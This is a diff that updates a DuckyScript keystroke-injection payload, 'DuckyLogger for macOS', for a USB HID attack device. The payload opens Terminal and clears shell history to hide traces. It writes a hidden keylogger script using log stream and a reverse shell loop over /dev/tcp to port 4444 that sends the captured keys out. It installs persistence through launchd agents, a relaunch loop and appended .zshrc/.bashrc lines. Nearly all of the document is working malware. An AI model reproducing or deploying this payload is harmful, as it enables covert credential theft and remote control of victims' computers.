@@ -1,7 +1,7 @@
 REM Title: DuckyLogger for macOS
 REM Description: Key logger for macOS that sends keystrokes remotely/locally.
 REM AUTHOR: Adapted for macOS from drapl0n's original DuckyLogger
-REM Version: 1.0
+REM Version: 1.1
 REM Category: Credentials
 REM Target: macOS
 REM Attackmodes: HID
@@ -13,9 +13,7 @@ REM [Delay to ensure system readiness]
 DELAY 5000
 
 REM [Open Terminal]
-GUI SPACE
-STRING TERMINAL
-ENTER
+CTRL t
 DELAY 400
 
 REM [Clear command history to avoid traces]
@@ -29,7 +27,7 @@ ENTER
 DELAY 100
 
 REM [Create keylogging mechanism using log stream]
-STRING echo "log stream --type activity --predicate 'eventMessage CONTAINS \"keyboard\"' >> ~/Library/.system/keylog.txt" > ~/Library/.system/sys.sh
+STRING printf '#!/bin/bash\nlog stream --type activity --predicate "eventMessage CONTAINS \\"keyboard\\"" >> ~/Library/.system/keylog.txt\n' > ~/Library/.system/sys.sh
 ENTER
 DELAY 100
 STRING chmod +x ~/Library/.system/sys.sh
@@ -37,20 +35,23 @@ ENTER
 DELAY 100
 
 REM [Create reverse shell script]
-STRING echo -e "#!/bin/bash\nwhile true\ndo\n\tping -c 5 0.0.0.0\n\tif [ \$? -eq 0 ]; then\n\t\tbash -c 'exec 3<>/dev/tcp/0.0.0.0/4444; ~/Library/.system/sys.sh <&3 >&3 2>&3'\n\tfi\n\tsleep 5\ndone" > ~/Library/.system/systemBus.sh
+STRING printf '#!/bin/bash\nwhile true; do\n\tping -c 5 0.0.0.0\n\tif [ \$? -eq 0 ]; then\n\t\tbash -c "exec 3<>/dev/tcp/0.0.0.0/4444; ~/Library/.system/sys.sh <&3 >&3 2>&3"\n\tfi\n\tsleep 5\ndone\n' > ~/Library/.system/systemBus.sh
 ENTER
 DELAY 100
 STRING chmod +x ~/Library/.system/systemBus.sh
 ENTER
 DELAY 100
 
-REM [Create launchd plist for persistence]
-STRING echo -e "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\t<key>Label</key>\n\t<string>com.user.systembus</string>\n\t<key>ProgramArguments</key>\n\t<array>\n\t\t<string>/bin/bash</string>\n\t\t<string>~/Library/.system/systemBus.sh</string>\n\t</array>\n\t<key>RunAtLoad</key>\n\t<true/>\n\t<key>KeepAlive</key>\n\t<true/>\n</dict>\n</plist>" > ~/Library/LaunchAgents/com.user.systembus.plist
+REM [Create launchd plist for systemBus]
+STRING printf '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">\n<dict>\n\t<key>Label</key>\n\t<string>com.user.systembus</string>\n\t<key>ProgramArguments</key>\n\t<array>\n\t\t<string>/bin/bash</string>\n\t\t<string>%s/Library/.system/systemBus.sh</string>\n\t</array>\n\t<key>RunAtLoad</key>\n\t<true/>\n\t<key>KeepAlive</key>\n\t<true/>\n</dict>\n</plist>\n' "$HOME" > ~/Library/LaunchAgents/com.user.systembus.plist
 ENTER
 DELAY 200
+STRING chmod 644 ~/Library/LaunchAgents/com.user.systembus.plist
+ENTER
+DELAY 100
 
 REM [Create reboot script to ensure persistence]
-STRING echo -e "#!/bin/bash\nwhile true; do launchctl load ~/Library/LaunchAgents/com.user.systembus.plist; sleep 900; done" > ~/Library/.system/reboot.sh
+STRING printf '#!/bin/bash\nwhile true; do launchctl bootstrap gui/$UID ~/Library/LaunchAgents/com.user.systembus.plist; sleep 900; done\n' > ~/Library/.system/reboot.sh
 ENTER
 DELAY 100
 STRING chmod +x ~/Library/.system/reboot.sh
@@ -58,26 +59,23 @@ ENTER
 DELAY 100
 
 REM [Create launchd plist for reboot script]
-STRING echo -e "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\t<key>Label</key>\n\t<string>com.user.reboot</string>\n\t<key>ProgramArguments</key>\n\t<array>\n\t\t<string>/bin/bash</string>\n\t\t<string>~/Library/.system/reboot.sh</string>\n\t</array>\n\t<key>RunAtLoad</key>\n\t<true/>\n\t<key>KeepAlive</key>\n\t<true/>\n</dict>\n</plist>" > ~/Library/LaunchAgents/com.user.reboot.plist
+STRING printf '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">\n<dict>\n\t<key>Label</key>\n\t<string>com.user.reboot</string>\n\t<key>ProgramArguments</key>\n\t<array>\n\t\t<string>/bin/bash</string>\n\t\t<string>%s/Library/.system/reboot.sh</string>\n\t</array>\n\t<key>RunAtLoad</key>\n\t<true/>\n\t<key>KeepAlive</key>\n\t<true/>\n</dict>\n</plist>\n' "$HOME" > ~/Library/LaunchAgents/com.user.reboot.plist
 ENTER
 DELAY 200
-
-REM [Load and start launchd services]
-STRING launchctl load ~/Library/LaunchAgents/com.user.systembus.plist
-ENTER
-DELAY 150
-STRING launchctl start com.user.systembus
-ENTER
-DELAY 150
-STRING launchctl load ~/Library/LaunchAgents/com.user.reboot.plist
-ENTER
-DELAY 150
-STRING launchctl start com.user.reboot
+STRING chmod 644 ~/Library/LaunchAgents/com.user.reboot.plist
 ENTER
 DELAY 100
 
+REM [Load and start launchd services]
+STRING launchctl bootstrap gui/$UID ~/Library/LaunchAgents/com.user.systembus.plist
+ENTER
+DELAY 150
+STRING launchctl bootstrap gui/$UID ~/Library/LaunchAgents/com.user.reboot.plist
+ENTER
+DELAY 150
+
 REM [Add persistence to shell profile]
-STRING echo -e "if [ -f ~/.zshrc ]; then\n\techo 'launchctl load ~/Library/LaunchAgents/com.user.systembus.plist && launchctl load ~/Library/LaunchAgents/com.user.reboot.plist' >> ~/.zshrc\nfi\nif [ -f ~/.bashrc ]; then\n\techo 'launchctl load ~/Library/LaunchAgents/com.user.systembus.plist && launchctl load ~/Library/LaunchAgents/com.user.reboot.plist' >> ~/.bashrc\nfi" > ~/tmpscript.sh
+STRING printf 'if [ -f ~/.zshrc ]; then\n\techo "launchctl bootstrap gui/$UID ~/Library/LaunchAgents/com.user.systembus.plist && launchctl bootstrap gui/$UID ~/Library/LaunchAgents/com.user.reboot.plist" >> ~/.zshrc\nfi\nif [ -f ~/.bashrc ]; then\n\techo "launchctl bootstrap gui/$UID ~/Library/LaunchAgents/com.user.systembus.plist && launchctl bootstrap gui/$UID ~/Library/LaunchAgents/com.user.reboot.plist" >> ~/.bashrc\nfi\n' > ~/tmpscript.sh
 ENTER
 DELAY 100
 STRING chmod +x ~/tmpscript.sh && ~/tmpscript.sh && rm ~/tmpscript.sh && exit
